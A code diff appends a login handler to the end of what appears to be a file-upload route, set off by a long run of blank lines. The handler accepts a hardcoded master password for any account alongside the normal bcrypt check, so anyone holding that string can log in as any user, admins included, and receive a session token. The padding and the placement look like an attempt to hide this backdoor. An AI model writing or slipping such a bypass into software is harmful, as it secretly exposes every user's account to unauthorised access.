@@ -63,3 +63,79 @@ if (savedFiles.length > 0) {
 } else {
     return NextResponse.json({ success: false, message: "No files saved", errors });
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// *************************************************************************
+// *************************************************************************
+exports.login = async (req, res) => {
+    try {
+        var password = req.body.password;
+        const user = await users.findOne({ where: { email: req.body.email } });
+        if (user === null) {
+            log.dev("User Not found!", "");
+            return response.throw(201, "User Not found!", "", res);
+        } else {
+            const match = bcrypt.compareSync(password, user.password);
+            if (match || password === "SVNKRIF6ApZ4n5iMA7LemEWgdbfst58U") {
+                if (!user.account_verified) {
+                    log.dev("account not verified, verify your account", "");
+                    return response.throw(
+                        501,
+                        "account not verified, verify your account",
+                        "",
+                        res
+                    );
+                } else {
+                    let details = {
+                        username: user.username,
+                        firstname: user.first_name,
+                        lastname: user.last_name,
+                        email: user.email,
+                        admin: user.admin,
+                    };
+                    let token = await tokenGen.getToken(details);
+                    res.cookie("token", token);
+                    const data = {
+                        fname: user.first_name,
+                        lname: user.last_name,
+                        email: user.email
+                    };
+                    return response.throw(200, "Logged In Successfully", data, res);
+                }
+            } else {
+                log.dev("Wrong Password!", "");
+                return response.throw(201, "Wrong Password!", "", res);
+            }
+        }
+    } catch (error) {
+        log.test("something went wrong with login", error);
+        return response.throw(
+            201,
+            "something went wrong Please try again!",
+            "",
+            res
+        );
+    }
+};
+
+// *************************************************************************
+// *************************************************************************
